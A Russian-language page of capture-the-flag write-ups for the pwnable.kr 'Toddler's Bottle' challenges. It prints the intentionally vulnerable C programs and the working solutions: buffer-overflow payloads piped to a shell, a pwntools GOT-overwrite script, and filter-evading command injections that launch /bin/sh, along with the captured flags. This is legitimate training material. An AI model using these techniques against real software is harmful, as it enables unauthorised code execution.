---
title: pwnable.kr [ru]
published: true
tags: [ "linux", "pwn", "lab" ]
image: assets/previews/12.jpg
layout: page
pagination: 
  enabled: true
---

# [](#header-1)[Toddler's Bottle]

## [](#header-2)fd

> Mommy! what is a file descriptor in Linux?
>
> try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:
>
> https://youtu.be/971eZhMHQQw
>
> ssh fd@pwnable.kr -p2222 (pw:guest)

**fd.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
  if(argc<2){
        printf("pass argv[1] a number\n");
        return 0;
  }
  int fd = atoi( argv[1] ) - 0x1234;
  int len = 0;
  len = read(fd, buf, 32);
  if(!strcmp("LETMEWIN\n", buf)){
        printf("good job :)\n");
        system("/bin/cat flag");
        exit(0);
  }
  printf("learn about Linux file IO\n");
  return 0;

}
```

Хотим получить stdin --> всё просто: 0x1234 - X = 0 --> x = 4660

```bash
./fd 4660
LETMEWIN

> Mama! Now_I_understand_what_file_descriptors_are!
```

## [](#header-2)collision

> Daddy told me about cool MD5 hash collision today.
> 
> I wanna do something like that too!
> 
> ssh col@pwnable.kr -p2222 (pw:guest)

**col.c**

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
  int* ip = (int*)p;
  int i;
  int res=0;
  for(i=0; i<5; i++){
        res += ip[i];
  }
  return res;
}

int main(int argc, char* argv[]){
  if(argc<2){
        printf("usage : %s [passcode]\n", argv[0]);
        return 0;
  }
  if(strlen(argv[1]) != 20){
        printf("passcode length should be 20 bytes\n");
        return 0;
  }

  if(hashcode == check_password( argv[1] )){
        system("/bin/cat flag");
        return 0;
  }
  else
        printf("wrong passcode.\n");
  return 0;
}
```

Вводится 20 символов, рабиваем их по 4: `AAAA AAAA AAAA AAAA AAAA`

Суммируем, равенство должно выполняться:

`0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 = 0x21DD09EC`

Подгоняем числа, выходит:

`0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cec8 + 0x6c5cecc`

```bash
./col $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xc8\xce\xc5\x06" * 4 + b"\xcc\xce\xc5\x06")')

> Two_hash_collision_Nicely
```

## [](#header-2)bof

> Nana told me that buffer overflow is one of the most common software vulnerability.
> Is that true? Download: http://pwnable.kr/bin/bof
> 
> Download: http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000
> ssh bof@pwnable.kr -p2222 (pw:guest)

**bof.c**

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
  char overflowme[32];
  printf("overflow me : ");
  gets(overflowme); // smash me!
  if(key == 0xcafebabe){
    system("/bin/sh");
  }
  else{
    printf("Nah..\n");
  }
}
int main(int argc, char* argv[]){
  func(0xdeadbeef);
  return 0;
}
```

Нужно перезаписать переменную на 0xcafebabe, находим в дебаггере правильный офсет, засылаем байты, cat'ом не даём stdout закрыться

```bash
(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41" * 52 + b"\xbe\xba\xfe\xca")'; cat) | nc 0 9000

> Daddy_I_just_pwned_a_buff3r!
```

## [](#header-2)passcode

> Mommy told me to make a passcode based login system.
> 
> My initial C code was compiled without any error!
> 
> Well, there was some compiler warning, but who cares about that?
> 
> ssh passcode@pwnable.kr -p2222 (pw:guest)

**passcode.c**

```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==338150 &amp;&amp; passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.0 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```

Отсутствие форматных символов в scanf'ах позволяет передать туда адреса и записать по ним, что нам нужно

Где находятся переменные:

`name: [ebp-0x70]
passcode1: [ebp-0x10]
passcode2: [ebp-0xc]
`

Но: char name[100]. passcode1 и passcode2 инты, каждый занимает 4 байта

Считаем оффсет, passcode1 - name = 0x70 - 0x10 = 0x60 = 96 байт

passcode1 занимает последние 4 байта массива name

* Заполняем массив до конца
* В последних 4-х байтах передаём адрес функции fflush из GOT - 0x0804a004
* scanf'ом в функции login перезаписываем адрес fflush в GOT на код, когда уже проверки прошли и функцией system вызывается cat - 0x080485e3 (передаём его в десятичной 134514147)
* При вызове fflush исполнение перейдёт на нужную нам часть листинга

```js
gdb-peda$ x/x 0x0804a004
0x804a004 <fflush@got.plt>: 0x08048436

gdb-peda$ x/x 0x0804a004
0x804a004 <fflush@got.plt>: 0x080485e3
```

```py
from pwn import *

context.log_level = "debug"

payload = "A" * 96
payload += "\x14\xc0\x04\x08" # address of fflush in GOT

target = process("./passcode")
target.recv()
target.sendline(payload)
target.recv()

target.send(str(int(0x08049298))) # address after jbe flag checks
target.interactive()
```

`> s0rry_mom_I_just_ign0red_c0mp1ler_w4rning`

## [](#header-2)random

> Daddy, teach me how to use random value in programming!
> 
> ssh random@pwnable.kr -p2222 (pw:guest)

**random.c**

```c
#include <stdio.h>

int main(){
        unsigned int random;
        random = rand();        // random value!

        unsigned int key=0;
        scanf("%d", &amp;key);

        if( (key ^ random) == 0xcafebabe ){
                printf("Good!\n");
                system("/bin/cat flag");
                return 0;
        }

        printf("Wrong, maybe you should try 2^32 cases.\n");
        return 0;
}
```

Не инициализирован сид для рандома (srand)

Первое значение рандома в си без инициализации - 0x6b8b4567

key ^ 0x6b8b4567 == 0xcafebabe --> 0x6b8b4567 ^ 0xcafebabe == 0xa175ffd9 == 2708864985

Передаём в прогу это число 2708864985


```bash
random@pwnable:~$ echo -ne "2708864985" | ./random

> m0mmy_I_can_predict_rand0m_v4lue!
```

## [](#header-2)input2

> Mom? how can I pass my input to a computer program?
> 
> ssh input2@pwnable.kr -p2222 (pw:guest)

**input.c**

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char* argv[], char* envp[]){
        printf("Welcome to pwnable.kr\n");
        printf("Let's see if you know how to give input to program\n");
        printf("Just give me correct inputs then you will get the flag :)\n");

        // argv
        if(argc != 100) return 0;
        if(strcmp(argv['A'],"\x00")) return 0;
        if(strcmp(argv['B'],"\x20\x0a\x0d")) return 0;
        printf("Stage 1 clear!\n");

        // stdio
        char buf[4];
        read(0, buf, 4);
        if(memcmp(buf, "\x00\x0a\x00\xff", 4)) return 0;
        read(2, buf, 4);
        if(memcmp(buf, "\x00\x0a\x02\xff", 4)) return 0;
        printf("Stage 2 clear!\n");

        // env
        if(strcmp("\xca\xfe\xba\xbe", getenv("\xde\xad\xbe\xef"))) return 0;
        printf("Stage 3 clear!\n");

        // file
        FILE* fp = fopen("\x0a", "r");
        if(!fp) return 0;
        if( fread(buf, 4, 1, fp)!=1 ) return 0;
        if( memcmp(buf, "\x00\x00\x00\x00", 4) ) return 0;
        fclose(fp);
        printf("Stage 4 clear!\n");

        // network
        int sd, cd;
        struct sockaddr_in saddr, caddr;
        sd = socket(AF_INET, SOCK_STREAM, 0);
        if(sd == -1){
                printf("socket error, tell admin\n");
                return 0;
        }
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = INADDR_ANY;
        saddr.sin_port = htons( atoi(argv['C']) );
        if(bind(sd, (struct sockaddr*)&saddr, sizeof(saddr)) < 0){
                printf("bind error, use another port\n");
                return 1;
        }
        listen(sd, 1);
        int c = sizeof(struct sockaddr_in);
        cd = accept(sd, (struct sockaddr *)&caddr, (socklen_t*)&c);
        if(cd < 0){
                printf("accept error, tell admin\n");
                return 0;
        }
        if( recv(cd, buf, 4, 0) != 4 ) return 0;
        if(memcmp(buf, "\xde\xad\xbe\xef", 4)) return 0;
        printf("Stage 5 clear!\n");

        // here's your flag
        system("/bin/cat flag");
        return 0;
}
```

python2

```python
import subprocess
import os
import socket
import time

os.system("mkdir /tmp/tests4")
os.system("ln -s /home/input2/flag /tmp/tests4/flag")

with open("/tmp/tests4/\x0a", "w") as f:
    f.write("\x00\x00\x00\x00")

stdin_r, stdin_w = os.pipe()
stderr_r, stderr_w = os.pipe()

args = ['X'] * 99
args[64] = ''
args[65] = "\x20\x0A\x0D"
args[66] = "65005"

process = subprocess.Popen(["/home/input2/input2"] + args, stdin=stdin_r, stderr=stderr_r, env={"\xDE\xAD\xBE\xEF": "\xCA\xFE\xBA\xBE"}, cwd="/tmp/tests4/")

os.write(stdin_w, "\x00\x0A\x00\xFF")
os.write(stderr_w, "\x00\x0A\x02\xFF")

time.sleep(3)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("localhost", 65005))
s.sendall('\xDE\xAD\xBE\xEF')
s.close()
```

`> Mommy_now_I_know_how_to_pa5s_inputs_in_Linux`

[stroobants.dev/pwnablekr-series-input.html](https://stroobants.dev/pwnablekr-series-input.htmlhttps://stroobants.dev/pwnablekr-series-input.html)


## [](#header-2)leg

> Daddy told me I should study arm.
> 
> But I prefer to study my leg!
> 
> Download: http://pwnable.kr/bin/leg.c
> 
> Download: http://pwnable.kr/bin/leg.asm
> 
> ssh leg@pwnable.kr -p2222 (pw:guest)

**leg.c**

```c
#include <stdio.h>
#include <fcntl.h>
int key1(){
  asm("mov r3, pc\n");
}
int key2(){
  asm(
  "push {r6}\n"
  "add  r6, pc, $1\n"
  "bx r6\n"
  ".code   16\n"
  "mov  r3, pc\n"
  "add  r3, $0x4\n"
  "push {r3}\n"
  "pop  {pc}\n"
  ".code  32\n"
  "pop  {r6}\n"
  );
}
int key3(){
  asm("mov r3, lr\n");
}
int main(){
  int key=0;
  printf("Daddy has very strong arm! : ");
  scanf("%d", &key);
  if( (key1()+key2()+key3()) == key ){
    printf("Congratz!\n");
    int fd = open("flag", O_RDONLY);
    char buf[100];
    int r = read(fd, buf, 100);
    write(0, buf, r);
  }
  else{
    printf("I have strong leg :P\n");
  }
  return 0;
}
```

**leg.asm**

```js
(gdb) disass main
Dump of assembler code for function main:
   0x00008d3c <+0>: push  {r4, r11, lr}
   0x00008d40 <+4>: add r11, sp, #8
   0x00008d44 <+8>: sub sp, sp, #12
   0x00008d48 <+12>:  mov r3, #0
   0x00008d4c <+16>:  str r3, [r11, #-16]
   0x00008d50 <+20>:  ldr r0, [pc, #104]  ; 0x8dc0 <main+132>
   0x00008d54 <+24>:  bl  0xfb6c <printf>
   0x00008d58 <+28>:  sub r3, r11, #16
   0x00008d5c <+32>:  ldr r0, [pc, #96] ; 0x8dc4 <main+136>
   0x00008d60 <+36>:  mov r1, r3
   0x00008d64 <+40>:  bl  0xfbd8 <__isoc99_scanf>
   0x00008d68 <+44>:  bl  0x8cd4 <key1>
   0x00008d6c <+48>:  mov r4, r0
   0x00008d70 <+52>:  bl  0x8cf0 <key2>
   0x00008d74 <+56>:  mov r3, r0
   0x00008d78 <+60>:  add r4, r4, r3
   0x00008d7c <+64>:  bl  0x8d20 <key3>
   0x00008d80 <+68>:  mov r3, r0
   0x00008d84 <+72>:  add r2, r4, r3
   0x00008d88 <+76>:  ldr r3, [r11, #-16]
   0x00008d8c <+80>:  cmp r2, r3
   0x00008d90 <+84>:  bne 0x8da8 <main+108>
   0x00008d94 <+88>:  ldr r0, [pc, #44] ; 0x8dc8 <main+140>
   0x00008d98 <+92>:  bl  0x1050c <puts>
   0x00008d9c <+96>:  ldr r0, [pc, #40] ; 0x8dcc <main+144>
   0x00008da0 <+100>: bl  0xf89c <system>
   0x00008da4 <+104>: b 0x8db0 <main+116>
   0x00008da8 <+108>: ldr r0, [pc, #32] ; 0x8dd0 <main+148>
   0x00008dac <+112>: bl  0x1050c <puts>
   0x00008db0 <+116>: mov r3, #0
   0x00008db4 <+120>: mov r0, r3
   0x00008db8 <+124>: sub sp, r11, #8
   0x00008dbc <+128>: pop {r4, r11, pc}
   0x00008dc0 <+132>: andeq r10, r6, r12, lsl #9
   0x00008dc4 <+136>: andeq r10, r6, r12, lsr #9
   0x00008dc8 <+140>:     ; <UNDEFINED> instruction: 0x0006a4b0
   0x00008dcc <+144>:     ; <UNDEFINED> instruction: 0x0006a4bc
   0x00008dd0 <+148>: andeq r10, r6, r4, asr #9
End of assembler dump.
(gdb) disass key1
Dump of assembler code for function key1:
   0x00008cd4 <+0>: push  {r11}   ; (str r11, [sp, #-4]!)
   0x00008cd8 <+4>: add r11, sp, #0
   0x00008cdc <+8>: mov r3, pc
   0x00008ce0 <+12>:  mov r0, r3
   0x00008ce4 <+16>:  sub sp, r11, #0
   0x00008ce8 <+20>:  pop {r11}   ; (ldr r11, [sp], #4)
   0x00008cec <+24>:  bx  lr
End of assembler dump.
(gdb) disass key2
Dump of assembler code for function key2:
   0x00008cf0 <+0>: push  {r11}   ; (str r11, [sp, #-4]!)
   0x00008cf4 <+4>: add r11, sp, #0
   0x00008cf8 <+8>: push  {r6}    ; (str r6, [sp, #-4]!)
   0x00008cfc <+12>:  add r6, pc, #1
   0x00008d00 <+16>:  bx  r6
   0x00008d04 <+20>:  mov r3, pc
   0x00008d06 <+22>:  adds  r3, #4
   0x00008d08 <+24>:  push  {r3}
   0x00008d0a <+26>:  pop {pc}
   0x00008d0c <+28>:  pop {r6}    ; (ldr r6, [sp], #4)
   0x00008d10 <+32>:  mov r0, r3
   0x00008d14 <+36>:  sub sp, r11, #0
   0x00008d18 <+40>:  pop {r11}   ; (ldr r11, [sp], #4)
   0x00008d1c <+44>:  bx  lr
End of assembler dump.
(gdb) disass key3
Dump of assembler code for function key3:
   0x00008d20 <+0>: push  {r11}   ; (str r11, [sp, #-4]!)
   0x00008d24 <+4>: add r11, sp, #0
   0x00008d28 <+8>: mov r3, lr
   0x00008d2c <+12>:  mov r0, r3
   0x00008d30 <+16>:  sub sp, r11, #0
   0x00008d34 <+20>:  pop {r11}   ; (ldr r11, [sp], #4)
   0x00008d38 <+24>:  bx  lr
End of assembler dump.
(gdb) 
```

`hex(0x8ce4 + 0x8d0c + 0x8d80)`
`> Out[33]: '0x1a770'`

```bash
> / $ ./leg
> 
> Daddy has very strong arm! : 108400

> daddy_has_lot_of_ARM_muscl3
```

## [](#header-2)mistake

> We all make mistakes, let’s move on.
> 
> don’t take this too seriously, no fancy hacking skill is required at all)
> 
> This task is based on real event
> 
> Thanks to dhmonkey
> 
> hint : operator priority
> 
> ssh mistake@pwnable.kr -p2222 (pw:guest)

**mistake.c**

```c
#include <stdio.h>
#include <fcntl.h>

#define PW_LEN 10
#define XORKEY 1

void xor(char* s, int len){
        int i;
        for(i=0; i<len; i++){
                s[i] ^= XORKEY;
        }
}

int main(int argc, char* argv[]){
        
        int fd;
        if(fd=open("/home/mistake/password",O_RDONLY,0400) < 0){
                printf("can't open password %d\n", fd);
                return 0;
        }

        printf("do not bruteforce...\n");
        sleep(time(0)%20);

        char pw_buf[PW_LEN+1];
        int len;
        if(!(len=read(fd,pw_buf,PW_LEN) > 0)){
                printf("read error\n");
                close(fd);
                return 0;               
        }

        char pw_buf2[PW_LEN+1];
        printf("input password : ");
        scanf("%10s", pw_buf2);

        // xor your input
        xor(pw_buf2, 10);

        if(!strncmp(pw_buf, pw_buf2, PW_LEN)){
                printf("Password OK\n");
                system("/bin/cat flag\n");
        } else{
                printf("Wrong Password\n");
        }

        close(fd);
        return 0;
}
```

В `fd=open("/home/mistake/password",O_RDONLY,0400) < 0` сначала выполняется правая часть, а в самом конце = `(fd = (1 < 0)) --> false`

Поэтому по итогу в fd, из которого по идее мы читаем(где должен быть дескриптор файла password), лежит 0, читаем из stdin'а

```
mistake@pwnable:~$ ./mistake

do not bruteforce…

@@@@@CCCCC

input password : AAAAABBBBB

Password OK

Mommy_the_0perator_priority_confuses_me
```

## [](#header-2)coin1

> Mommy, I wanna play a game!
> 
> (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)
> 
> Running at : nc pwnable.kr 9007
>
> ssh coin1@pwnable.kr -p2222
>
> nc 0 9007 to get flag!

```
        ---------------------------------------------------
        -              Shall we play a game?              -
        ---------------------------------------------------

        You have given some gold coins in your hand
        however, there is one counterfeit coin among them
        counterfeit coin looks exactly same as real coin
        however, its weight is different from real one
        real coin weighs 10, counterfeit coin weighes 9
        help me to find the counterfeit coin with a scale
        if you find 100 counterfeit coins, you will get reward :)
        FYI, you have 60 seconds.

        - How to play - 
        1. you get a number of coins (N) and number of chances (C)
        2. then you specify a set of index numbers of coins to be weighed
        3. you get the weight information
        4. 2~3 repeats C time, then you give the answer

        - Example -
        [Server] N=4 C=2        # find counterfeit among 4 coins with 2 trial
        [Client] 0 1            # weigh first and second coin
        [Server] 20                     # scale result : 20
        [Client] 3                      # weigh fourth coin
        [Server] 10                     # scale result : 10
        [Client] 2                      # counterfeit coin is third!
        [Server] Correct!

        - Ready? starting in 3 sec... -
```

Бинарная сортировка тупа

Ну чё, посортируем

```python
from pwn import *

# For SSHing in, and then running locally
# s = ssh(host="pwnable.kr", user="fd", port=2222, password="guest")
# conn = s.remote('localhost', 9007)

# For running remotely
#conn = remote('pwnable.kr', 9007)

# For running locally on pwnable.kr
# Всё оч медленно, поэтому, кроме как подконнектиться и запустить локально, вариков нет
conn = remote('localhost', 9007)

conn.recvuntil('Ready? starting in 3 sec')
conn.recvline()
conn.recvline()

for _ in range(100):

        line = conn.recvline().decode('utf-8').strip().split(' ') # [u'N=317', u'C=9']
        # print line
        n = int(line[0].split('=')[1])  # 317
        c = int(line[1].split('=')[1])  # 9

        start = 0
        end = n - 1

        for _ in range(c):

                mid = int((start + end)/2) # cast to ensure only whole numbers

                # print('start: '+str(start))
                # print('mid: '+str(mid))
                # print('end: '+str(end))

                guess = ' '.join(str(i) for i in range(start, mid + 1))
                # print guess
                conn.sendline(guess)
                weight = int(conn.recvline())
                # print weight

                if weight % 10 == 0: # if divisible by 10, then no counterfeit in list
                        start = mid + 1
                else: # counterfeit in list
                        end = mid

        conn.sendline(str(start)) # send final guess

        print(conn.recvline())  # Correct! (n)

print(conn.recvline()) # Congrats! get your flag
print(conn.recvline()) # {actual flag}

conn.close()
```

`b1naRy_S34rch1Ng_1s_3asy_p3asy`

[код отсюда](https://zacheller.dev/pwnable-coin1)

## [](#header-2)blackjack

> Hey! check out this C implementation of blackjack game!
> 
> I found it online
> 
> http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html
> 
> I like to give my flags to millionares.
> 
> how much money you got?
> 
> Running at : nc pwnable.kr 9009

Видим код и реализацию betting

```c
int betting() //Asks user amount to bet
{
 printf("\n\nEnter Bet: $");
 scanf("%d", &bet);

 if (bet > cash) //If player tries to bet more money than player has
 {
    printf("\nYou cannot bet more money than you have.");
    printf("\nEnter Bet: ");
        scanf("%d", &bet);
        return bet;
 }
 else return bet;
 ```

Всего лишь два прохода, на втором нет проверки bet > cash

2 варианта:

1) Ввести сначала число больше 500 --> попадаем в if

2) Вводим еще раз число больше 2147483047

3) Выигрываем в партии --> профит

<br>

1) Вводим отрицательное число --> - - = +

2) Проигрываем

`> Woohoo_I_am_now_a_MILL10NAIRE!`

## [](#header-2)lotto

> Mommy! I made a lotto program for my homework.
> 
> do you want to play?
> 
> ssh lotto@pwnable.kr -p2222 (pw:guest)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

unsigned char submit[6];

void play(){
  
  int i;
  printf("Submit your 6 lotto bytes : ");
  fflush(stdout);

  int r;
  r = read(0, submit, 6);

  printf("Lotto Start!\n");
  //sleep(1);

  // generate lotto numbers
  int fd = open("/dev/urandom", O_RDONLY);
  if(fd==-1){
    printf("error. tell admin\n");
    exit(-1);
  }
  unsigned char lotto[6];
  if(read(fd, lotto, 6) != 6){
    printf("error2. tell admin\n");
    exit(-1);
  }
  for(i=0; i<6; i++){
    lotto[i] = (lotto[i] % 45) + 1;   // 1 ~ 45
  }
  close(fd);
  
  // calculate lotto score
  int match = 0, j = 0;
  for(i=0; i<6; i++){
    for(j=0; j<6; j++){
      if(lotto[i] == submit[j]){
        match++;
      }
    }
  }

  // win!
  if(match == 6){
    system("/bin/cat flag");
  }
  else{
    printf("bad luck...\n");
  }

}

void help(){
  printf("- nLotto Rule -\n");
  printf("nlotto is consisted with 6 random natural numbers less than 46\n");
  printf("your goal is to match lotto numbers as many as you can\n");
  printf("if you win lottery for *1st place*, you will get reward\n");
  printf("for more details, follow the link below\n");
  printf("http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n");
  printf("mathematical chance to win this game is known to be 1/8145060.\n");
}

int main(int argc, char* argv[]){

  // menu
  unsigned int menu;

  while(1){

    printf("- Select Menu -\n");
    printf("1. Play Lotto\n");
    printf("2. Help\n");
    printf("3. Exit\n");

    scanf("%d", &menu);

    switch(menu){
      case 1:
        play();
        break;
      case 2:
        help();
        break;
      case 3:
        printf("bye\n");
        return 0;
      default:
        printf("invalid menu\n");
        break;
    }
  }
  return 0;
}
```

Проверяется один байт рандома с 6-ью байтами инпута, занчит все байты инпута должны быть одинаковыми, пишем скрипт и надеемся на рандом! Диапазон от 1 до 45

```python
from pwn import *

#sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222)
p = process('./lotto')

for i in range(1000):
  p.recv()
  p.sendline('1')
  p.recv()
  p.sendline('------')
  _ , ans = p.recvlines(2)
  if "bad" not in ans:
    print(ans)
    break
```

`> Sorry_mom_1_Forgot_to_check_duplicates`

## [](#header-2)cmd1

> Mommy! what is PATH environment in Linux?
> 
> ssh cmd1@pwnable.kr -p2222 (pw:guest)

**cmd1.c**

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```

Notice the difference between single quotes and double quotes in argv:

`$ ./test '$(echo abc)'`

`argv[1] = $(echo abc)`

`$ ./test "$(echo abc)"`

`argv[1] = abc`

Single quotes pass the command without executing it. 

Double quotes executes the command then passes its output (cannot pass the filter).

```bash
> ./cmd1 '$(printf "/bin/%s%s" "s" "h")'
> /bin/cat /home/cmd1/flag
>
> PATH_environment?_Now_I_really_g3t_it,_mommy!
```

## [](#header-2)cmd2

> Daddy bought me a system command shell.
> 
> but he put some filters to prevent me from playing with it without his permission…
> 
> but I wanna play anytime I want!
> 
> ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```

`./cmd2 '$(printf "%bbin%bbash -p" "\57" "\57")'`

(и гениальное)

`./cmd2 '$(read x; echo $x)'`

`FuN_w1th_5h3ll_v4riabl3s_haha`

## [](#header-2)memcpy
> Are you tired of hacking?, take some rest here.
> Just help me out with my small experiment regarding memcpy performance. 
> after that, flag is yours.
> 
> http://pwnable.kr/bin/memcpy.c
> 
> ssh memcpy@pwnable.kr -p2222 (pw:guest)

memcpy.c:
```c
// compiled with : gcc -o memcpy memcpy.c -m32 -lm
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/mman.h>
#include <math.h>

unsigned long long rdtsc(){
        asm("rdtsc");
}

char* slow_memcpy(char* dest, const char* src, size_t len){
	int i;
	for (i=0; i<len; i++) {
		dest[i] = src[i];
	}
	return dest;
}

char* fast_memcpy(char* dest, const char* src, size_t len){
	size_t i;
	// 64-byte block fast copy
	if(len >= 64){
		i = len / 64;
		len &= (64-1);
		while(i-- > 0){
			__asm__ __volatile__ (
			"movdqa (%0), %%xmm0\n"
			"movdqa 16(%0), %%xmm1\n"
			"movdqa 32(%0), %%xmm2\n"
			"movdqa 48(%0), %%xmm3\n"
			"movntps %%xmm0, (%1)\n"
			"movntps %%xmm1, 16(%1)\n"
			"movntps %%xmm2, 32(%1)\n"
			"movntps %%xmm3, 48(%1)\n"
			::"r"(src),"r"(dest):"memory");
			dest += 64;
			src += 64;
		}
	}

	// byte-to-byte slow copy
	if(len) slow_memcpy(dest, src, len);
	return dest;
}

int main(void){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Hey, I have a boring assignment for CS class.. :(\n");
	printf("The assignment is simple.\n");

	printf("-----------------------------------------------------\n");
	printf("- What is the best implementation of memcpy?        -\n");
	printf("- 1. implement your own slow/fast version of memcpy -\n");
	printf("- 2. compare them with various size of data         -\n");
	printf("- 3. conclude your experiment and submit report     -\n");
	printf("-----------------------------------------------------\n");

	printf("This time, just help me out with my experiment and get flag\n");
	printf("No fancy hacking, I promise :D\n");

	unsigned long long t1, t2;
	int e;
	char* src;
	char* dest;
	unsigned int low, high;
	unsigned int size;
	// allocate memory
	char* cache1 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	char* cache2 = mmap(0, 0x4000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
	src = mmap(0, 0x2000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

	size_t sizes[10];
	int i=0;

	// setup experiment parameters
	for(e=4; e<14; e++){	// 2^13 = 8K
		low = pow(2,e-1);
		high = pow(2,e);
		printf("specify the memcpy amount between %d ~ %d : ", low, high);
		scanf("%d", &size);
		if( size < low || size > high ){
			printf("don't mess with the experiment.\n");
			exit(0);
		}
		sizes[i++] = size;
	}

	sleep(1);
	printf("ok, lets run the experiment with your configuration\n");
	sleep(1);

	// run experiment
	for(i=0; i<10; i++){
		size = sizes[i];
		printf("experiment %d : memcpy with buffer size %d\n", i+1, size);
		dest = malloc( size );

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		slow_memcpy(dest, src, size);		// byte-to-byte memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for slow_memcpy : %llu\n", t2-t1);

		memcpy(cache1, cache2, 0x4000);		// to eliminate cache effect
		t1 = rdtsc();
		fast_memcpy(dest, src, size);		// block-to-block memcpy
		t2 = rdtsc();
		printf("ellapsed CPU cycles for fast_memcpy : %llu\n", t2-t1);
		printf("\n");
	}

	printf("thanks for helping my experiment!\n");
	printf("flag : ----- erased in this source code -----\n");
	return 0;
}
```

Commands `movntps` and `movdqa` work only with memory operands aligned on a 16-byte

While debugging we get an error that `movdqa` tries to copy data to dest operand, which adress is not alligned by 16

According to glibc operands in 32 bit by default alligned as 8 (-m32 was used while compiling, so)

```
memcpy@pwnable:~$ nc 0 9022 < /tmp/inp
Hey, I have a boring assignment for CS class.. :(
The assignment is simple.
-----------------------------------------------------
- What is the best implementation of memcpy?        -
- 1. implement your own slow/fast version of memcpy -
- 2. compare them with various size of data         -
- 3. conclude your experiment and submit report     -
-----------------------------------------------------
This time, just help me out with my experiment and get flag
No fancy hacking, I promise :D
specify the memcpy amount between 8 ~ 16 : specify the memcpy amount between 16 ~ 32 : specify the memcpy amount between 32 ~ 64 : specify the memcpy amount between 64 ~ 128 : specify the memcpy amount between 128 ~ 256 : specify the memcpy amount between 256 ~ 512 : specify the memcpy amount between 512 ~ 1024 : specify the memcpy amount between 1024 ~ 2048 : specify the memcpy amount between 2048 ~ 4096 : specify the memcpy amount between 4096 ~ 8192 : ok, lets run the experiment with your configuration
experiment 1 : memcpy with buffer size 8
ellapsed CPU cycles for slow_memcpy : 5616
ellapsed CPU cycles for fast_memcpy : 620

experiment 2 : memcpy with buffer size 16
ellapsed CPU cycles for slow_memcpy : 908
ellapsed CPU cycles for fast_memcpy : 606

experiment 3 : memcpy with buffer size 32
ellapsed CPU cycles for slow_memcpy : 1046
ellapsed CPU cycles for fast_memcpy : 1084

experiment 4 : memcpy with buffer size 72
ellapsed CPU cycles for slow_memcpy : 1662
ellapsed CPU cycles for fast_memcpy : 640

experiment 5 : memcpy with buffer size 136
ellapsed CPU cycles for slow_memcpy : 2978
ellapsed CPU cycles for fast_memcpy : 580

experiment 6 : memcpy with buffer size 264
ellapsed CPU cycles for slow_memcpy : 5514
ellapsed CPU cycles for fast_memcpy : 608

experiment 7 : memcpy with buffer size 520
ellapsed CPU cycles for slow_memcpy : 11344
ellapsed CPU cycles for fast_memcpy : 756

experiment 8 : memcpy with buffer size 1032
ellapsed CPU cycles for slow_memcpy : 22016
ellapsed CPU cycles for fast_memcpy : 1038

experiment 9 : memcpy with buffer size 2056
ellapsed CPU cycles for slow_memcpy : 42144
ellapsed CPU cycles for fast_memcpy : 1684

experiment 10 : memcpy with buffer size 4096
ellapsed CPU cycles for slow_memcpy : 83962
ellapsed CPU cycles for fast_memcpy : 2612

thanks for helping my experiment!
flag : 1_w4nn4_br34K_th3_m3m0ry_4lignm3nt
```

## [](#header-2)asm
